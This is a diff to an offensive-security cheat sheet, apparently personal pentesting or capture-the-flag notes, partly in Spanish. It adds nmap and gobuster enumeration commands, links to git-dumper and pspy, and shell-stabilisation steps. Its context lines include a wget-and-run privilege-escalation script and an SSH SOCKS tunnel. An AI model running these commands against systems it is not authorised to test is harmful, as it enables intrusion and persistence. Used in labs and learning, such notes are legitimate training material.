@@ -1,5 +1,5 @@
 
-
+- [Enumeracion](#Enumeracion)
 - [Password Attacks](#password-attacks)
 - [File Transfers](#file-transfers)
 - [Reverse Shells](#reverse-shells)
@@ -11,6 +11,21 @@
 - [Pivoting](#pivoting)
 - [Exfiltración de datos](#exfiltracion)
 - [Limpiando huellas](#limpiar-huellas)
+
+# Enumeracion
+
+sudo nmap -p- --open -vvv --min-rate 5000 -sS -Pn 10.10.10.4 -oN nmap
+sudo nmap -sVC -p135,139,445 10.10.10.4 -oN nmap.service
+
+## Directorios
+
+gobuster dir -u [URL] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 
+
+## Tools
+
+### Git
+
+https://github.com/arthaud/git-dumper.git
 
 # Password Attacks
 
@@ -219,6 +234,8 @@ chmod +x ./unix-privesc-check
 
 wget 10.10.10.10/solaris-exploit-suggester.pl
 perl solaris-exploit-suggester.pl
+
+https://github.com/DominicBreuker/pspy
 ```
 
 Local
@@ -314,3 +331,13 @@ ssh root@10.10.1.1 -D 8834 >> tunneling socks proxy using web
 
 
 # Limpiando huellas
+
+# Tips
+
+script /dev/null -c bash
+ctrl Z
+stty raw -echo;fg
+reset xterm 
+export TERM=xterm-256color
+export SHELL=bash
+source /etc/skel/.bashrc
